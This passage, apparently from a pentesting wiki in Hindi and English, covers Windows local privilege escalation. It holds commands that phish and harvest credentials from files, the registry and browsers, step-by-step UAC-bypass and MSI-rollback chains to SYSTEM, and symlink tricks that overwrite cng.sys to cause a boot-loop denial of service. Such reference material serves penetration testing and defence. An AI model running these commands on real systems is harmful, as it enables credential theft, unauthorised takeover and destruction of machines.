आप हमेशा **उपयोगकर्ता से उसके credentials या किसी दूसरे उपयोगकर्ता के credentials दर्ज करने के लिए कह सकते हैं** अगर आप सोचते हैं कि वह उन्हें जानता होगा (ध्यान दें कि क्लाइंट से सीधे **पूछना** कि उसके **credentials** क्या हैं वास्तव में **जोखिम भरा** है):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **संभावित फ़ाइल नाम जिनमें credentials शामिल हो सकते हैं**

ज्ञात फ़ाइलें जो कुछ समय पहले **passwords** **clear-text** या **Base64** में रखती थीं
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
सभी प्रस्तावित फ़ाइलों को खोजें:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin में Credentials

आपको Bin को भी जांचना चाहिए ताकि उसके अंदर मौजूद credentials की तलाश कर सकें।

कई प्रोग्रामों द्वारा सेव किए गए पासवर्डों को **पुनर्प्राप्त करने** के लिए आप उपयोग कर सकते हैं: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### रजिस्ट्री के अंदर

**अन्य संभावित रजिस्ट्री कुंजियाँ जिनमें credentials हो सकते हैं**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ब्राउज़रों का इतिहास

आपको उन DBs की जाँच करनी चाहिए जहाँ **Chrome or Firefox** के passwords स्टोर होते हैं।\
साथ ही ब्राउज़रों के history, bookmarks और favourites भी चेक करें — शायद कुछ **passwords** वहीं स्टोर हों।

ब्राउज़रों से passwords निकालने के टूल:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Component Object Model (COM) Windows ऑपरेटिंग सिस्टम में बनी एक टेक्नोलॉजी है जो विभिन्न भाषाओं में बने सॉफ़्टवेयर components के बीच intercommunication की अनुमति देती है। हर COM component को एक class ID (CLSID) से पहचाना जाता है और हर component एक या अधिक interfaces के जरिए functionality एक्सपोज़ करता है, जिन्हें interface IDs (IIDs) से पहचाना जाता है।

COM classes और interfaces registry में **HKEY\CLASSES\ROOT\CLSID** और **HKEY\CLASSES\ROOT\Interface** के अंतर्गत परिभाषित होते हैं। यह registry **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** को merge करके बनाई जाती है = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

बुनियादी तौर पर, अगर आप किसी भी ऐसे DLL को overwrite कर सकें जो execute होने वाले हों, तो आप privileges escalate कर सकते हैं यदि वह DLL किसी दूसरे user द्वारा execute किया जाएगा।

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **फाइलों और रजिस्ट्री में सामान्य पासवर्ड खोज**

**फाइल की सामग्री खोजें**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**किसी विशिष्ट फ़ाइलनाम वाली फ़ाइल खोजें**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**registry में key names और passwords खोजें**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Passwords खोजने वाले टूल्स

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **msf का** प्लगइन है। मैंने यह प्लगइन बनाया है ताकि यह **स्वतः execute करे उन सभी metasploit POST module को जो credentials खोजते हैं** victim के अंदर.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) स्वतः उन सभी फ़ाइलों को search करता है जिनमें इस पृष्ठ में बताए गए passwords मौजूद हैं.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) एक और बढ़िया टूल है जो system से password extract करता है.

The tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) search for **sessions**, **usernames** and **passwords** of several tools that save this data in clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, referred to as **pipes**, enable process communication and data transfer.

Windows provides a feature called **Named Pipes**, allowing unrelated processes to share data, even over different networks. This resembles a client/server architecture, with roles defined as **named pipe server** and **named pipe client**.

When data is sent through a pipe by a **client**, the **server** that set up the pipe has the ability to **take on the identity** of the **client**, assuming it has the necessary **SeImpersonate** rights. Identifying a **privileged process** that communicates via a pipe you can mimic provides an opportunity to **gain higher privileges** by adopting the identity of that process once it interacts with the pipe you established. For instructions on executing such an attack, helpful guides can be found [**here**](named-pipe-client-impersonation.md) and [**here**](#from-high-integrity-to-system).

Also the following tool allows to **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

इस पृष्ठ को देखें **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links forwarded to `ShellExecuteExW` can trigger dangerous URI handlers (`file:`, `ms-appinstaller:` or any registered scheme) and execute attacker-controlled files as the current user. See:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

When getting a shell as a user, there may be scheduled tasks or other processes being executed which **pass credentials on the command line**. The script below captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

यदि आपके पास graphical interface (via console or RDP) तक पहुँच है और UAC सक्षम है, तो Microsoft Windows के कुछ संस्करणों में unprivileged user से terminal या किसी अन्य process जैसे "NT\AUTHORITY SYSTEM" चलाना संभव है।

यह एक ही vulnerability के जरिए privileges escalate करने और उसी समय UAC को bypass करने की अनुमति देता है। इसके अलावा, कुछ भी install करने की आवश्यकता नहीं है और प्रक्रिया के दौरान उपयोग किया गया binary Microsoft द्वारा signed और issued है।

प्रभावित प्रणालियों में कुछ निम्नलिखित हैं:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
इस vulnerability को exploit करने के लिए, निम्नलिखित steps आवश्यक हैं:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## Administrator से Medium से High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename से SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

यह हमला मूलतः Windows Installer के rollback फीचर का दुरुपयोग करके uninstall प्रक्रिया के दौरान वैध फाइलों को malicious फाइलों से बदलने पर आधारित है। इसके लिए attacker को एक **malicious MSI installer** बनाना पड़ता है जो `C:\Config.Msi` फ़ोल्डर को hijack करने में इस्तेमाल होगा, जिसे बाद में Windows Installer अन्य MSI पैकेजों के uninstall के दौरान rollback फ़ाइलें संग्रहीत करने के लिए उपयोग करेगा — जहाँ rollback फ़ाइलों को malicious payload रखने के लिए संशोधित किया जा सकेगा।

संक्षेप में तकनीक इस प्रकार है:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### Arbitrary File Delete/Move/Rename से SYSTEM EoP

The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?

You could exploit **NTFS internals**: every folder has a hidden alternate data stream called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
यह स्ट्रीम फ़ोल्डर का **इंडेक्स मेटाडेटा** संग्रहीत करता है।

तो, अगर आप फ़ोल्डर का **`::$INDEX_ALLOCATION` स्ट्रीम हटाते हैं**, तो NTFS फ़ाइल सिस्टम से पूरा फ़ोल्डर **हटा देता है**।

आप यह मानक फ़ाइल हटाने APIs का उपयोग करके कर सकते हैं, जैसे:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> भले ही आप *file* delete API को कॉल कर रहे हों, यह **folder स्वयं डिलीट कर देता है**।

### From Folder Contents Delete to SYSTEM EoP
क्या होगा अगर आपका primitive आपको arbitrary files/folders delete करने की अनुमति नहीं देता, लेकिन यह **attacker-controlled folder के *contents* को delete करने की अनुमति देता है**?

1. Step 1: एक चारा folder और file सेटअप करें
- बनाएं: `C:\temp\folder1`
- इसके अंदर: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` पर एक **oplock** रखें
- जब कोई privileged process `file1.txt` को delete करने की कोशिश करता है तो oplock **execution को रोक देता है**।
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. चरण 3: SYSTEM प्रक्रिया ट्रिगर करें (उदा., `SilentCleanup`)
- यह प्रक्रिया फ़ोल्डरों को स्कैन करती है (उदा., `%TEMP%`) और उनकी सामग्री को हटाने की कोशिश करती है।
- जब यह `file1.txt` पर पहुँचता है, तो **oplock triggers** और कंट्रोल आपके callback को सौंप देता है।

4. चरण 4: oplock callback के अंदर – deletion को redirect करें

- विकल्प A: `file1.txt` को कहीं और मूव करें
- इससे `folder1` बिना oplock टूटे खाली हो जाता है।
- `file1.txt` को सीधे डिलीट न करें — इससे oplock समय से पहले रिलीज़ हो जाएगा।

- विकल्प B: `folder1` को एक **junction** में कन्वर्ट करें:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- विकल्प C: `\RPC Control` में एक **symlink** बनाएँ:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> यह NTFS internal stream को लक्षित करता है जो फ़ोल्डर मेटाडेटा स्टोर करता है — इसे हटाने पर फ़ोल्डर हट जाता है।

5. Step 5: Release the oplock
- SYSTEM process जारी रहता है और `file1.txt` को डिलीट करने की कोशिश करता है।
- लेकिन अब, junction + symlink की वजह से, यह वास्तव में डिलीट कर रहा है:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**परिणाम**: `C:\Config.Msi` को SYSTEM द्वारा हटा दिया जाता है।

### From Arbitrary Folder Create to Permanent DoS

एक primitive का उपयोग करें जो आपको **create an arbitrary folder as SYSTEM/admin** करने देता है — भले ही आप **you can’t write files** या **set weak permissions** कर न सकें।

एक **folder** (not a file) बनाएं जिसका नाम एक **critical Windows driver** जैसा हो, उदाहरण:
```
C:\Windows\System32\cng.sys
```
- यह पथ सामान्यतः `cng.sys` kernel-mode driver से मेल खाता है।
- यदि आप इसे **फ़ोल्डर के रूप में पहले से बना देते हैं**, तो Windows boot पर वास्तविक driver को लोड करने में विफल हो जाता है।
- फिर, Windows boot के दौरान `cng.sys` को लोड करने की कोशिश करता है।
- यह फ़ोल्डर देखता है, **वास्तविक driver को resolve करने में विफल रहता है**, और **crash हो जाता है या boot रुक जाता है**।
- कोई **fallback नहीं** है, और बिना बाहरी हस्तक्षेप (उदा., boot repair या disk access) के **कोई recovery नहीं**।

### Privileged log/backup paths + OM symlinks से arbitrary file overwrite / boot DoS तक

जब कोई **privileged service** ऐसे पथ पर logs/exports लिखता है जो किसी **writable config** से पढ़ा गया है, तो उस पथ को **Object Manager symlinks + NTFS mount points** से redirect करके privileged write को arbitrary overwrite में बदल दिया जा सकता है (यहाँ तक कि **बिना** SeCreateSymbolicLinkPrivilege के)।

**आवश्यकताएँ**
- लक्षित पथ संग्रहित करने वाली config attacker द्वारा writable हो (उदा., `%ProgramData%\...\.ini`)।
- `\RPC Control` पर माउंट प्वाइंट बनाने और एक OM file symlink बनाने की क्षमता (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools))।
- एक privileged ऑपरेशन जो उस पथ पर लिखता हो (log, export, report).

**उदाहरण श्रृंखला**
1. प्रिविलेज्ड लॉग गंतव्य पुनः प्राप्त करने के लिए config पढ़ें, जैसे `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` जो `C:\ProgramData\ICONICS\IcoSetup64.ini` में है।
2. बिना admin के पथ को redirect करें:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. प्रिविलेज्ड कंपोनेंट के लॉग लिखने का इंतज़ार करें (उदा., admin "send test SMS" ट्रिगर करता है)। अब लेखन `C:\Windows\System32\cng.sys` में हो रहा है।
4. ओवरराइट किए गए टार्गेट (hex/PE parser) का निरीक्षण करें ताकि भ्रष्टता की पुष्टि हो सके; reboot मजबूर करेगा Windows को कि वह टैम्पर किए गए ड्राइवर पाथ को लोड करे → **boot loop DoS**. यह किसी भी protected फ़ाइल पर भी सामान्यीकृत होता है जिसे कोई प्रिविलेज्ड सेवा write के लिए खोलेगी।

> `cng.sys` सामान्यतः `C:\Windows\System32\drivers\cng.sys` से लोड होता है, लेकिन अगर `C:\Windows\System32\cng.sys` में एक कॉपी मौजूद है तो पहले वही प्रयास किया जा सकता है, जिससे यह भ्रष्ट डेटा के लिए एक विश्वसनीय DoS sink बन जाता है।



## **High Integrity से System तक**

### **नई सेवा**

यदि आप पहले से ही किसी High Integrity process पर चल रहे हैं, तो **SYSTEM तक का रास्ता** बस **एक नई सेवा बनाकर और उसे चलाकर** आसान हो सकता है:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> जब आप एक service बाइनरी बना रहे हों तो सुनिश्चित करें कि वह एक मान्य service हो या बाइनरी आवश्यक कार्रवाइयाँ जल्दी से करे, क्योंकि यदि वह मान्य service नहीं है तो 20s में उसे खत्म कर दिया जाएगा।

### AlwaysInstallElevated

High Integrity process से आप **AlwaysInstallElevated registry entries को enable करने** और _**.msi**_ wrapper का उपयोग करके एक reverse shell **install** करने की कोशिश कर सकते हैं।\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**आप** [**यहाँ कोड देख सकते हैं**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

यदि आपके पास ये token privileges हैं (संभवतः आप इसे पहले से किसी High Integrity process में पाएँगे), तो आप लगभग किसी भी प्रक्रिया (protected processes नहीं) को SeDebug privilege के साथ **open** कर पाएँगे, उस प्रक्रिया का **token copy** कर सकते हैं, और उस token के साथ एक arbitrary process **create** कर सकते हैं।\
इस तकनीक का उपयोग अमूमन उन प्रक्रियाओं पर किया जाता है जो SYSTEM के रूप में चल रही हों और जिनके पास सभी token privileges हों (_हाँ, आप ऐसे SYSTEM processes भी पा सकते हैं जिनके पास सभी token privileges नहीं होते_)।\
**आप** [**यहाँ प्रस्तावित तकनीक को लागू करने वाले कोड का उदाहरण देख सकते हैं**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

यह तकनीक meterpreter द्वारा `getsystem` में escalate करने के लिए उपयोग होती है। तकनीक यह है कि **एक pipe बनाया जाए और फिर उस pipe पर लिखने के लिए किसी service को बनाया/abuse किया जाए**। फिर, वह **server** जिसने pipe बनाया और जिसके पास **`SeImpersonate`** privilege है, pipe client (service) के token को **impersonate** कर सकेगा और SYSTEM privileges प्राप्त कर लेगा।\
यदि आप [**name pipes के बारे में और जानना चाहते हैं तो यह पढ़ें**](#named-pipe-client-impersonation)。\
यदि आप यह पढ़ना चाहते हैं कि [**कैसे high integrity से System तक name pipes का उपयोग करके जाएँ**](from-high-integrity-to-system-with-name-pipes.md)，तो यह उदाहरण पढ़ें।

### Dll Hijacking

यदि आप किसी ऐसी dll को hijack करने में सफल हो जाते हैं जिसे SYSTEM के रूप में चल रही किसी प्रक्रिया द्वारा load किया जा रहा है, तो आप उन permissions के साथ arbitrary code execute कर पाएँगे। इसलिए Dll Hijacking ऐसी privilege escalation के लिए उपयोगी है, और ऊपर से, यह high integrity process से हासिल करना कहीं अधिक आसान है क्योंकि वहाँ DLLs load करने वाले फोल्डरों पर write permissions होते हैं।\
**आप** [**Dll hijacking के बारे में अधिक यहाँ पढ़ सकते हैं**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## और मदद

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## उपयोगी टूल

**Windows local privilege escalation vectors देखने के लिए सबसे अच्छा टूल:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations और sensitive files के लिए जाँच (यहाँ देखें:**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- कुछ संभावित misconfigurations की जाँच और जानकारी इकट्ठा करना (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations की जाँच**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla, और RDP saved session जानकारी निकालता है। स्थानीय रूप से -Thorough का उपयोग करें।**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager से credentials निकालता है। Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- इकट्ठे किए गए पासवर्ड domain पर spray करता है**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh एक PowerShell ADIDNS/LLMNR/mDNS spoofer और man-in-the-middle टूल है।**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- बेसिक privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- ज्ञात privesc vulnerabilities खोजना (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- लोकल चेक्स **(Admin rights की आवश्यकता)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- ज्ञात privesc vulnerabilities खोजता है (VisualStudio का उपयोग करके compile करने की आवश्यकता) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- मेजबान की misconfigurations खोजने के लिए enumerate करता है (ज्यादा एक gather info tool है बजाय privesc के) (compile करने की आवश्यकता) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- कई सॉफ़्टवेयर से credentials निकालता है (github में precompiled exe मौजूद)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp का C# पोर्ट**\
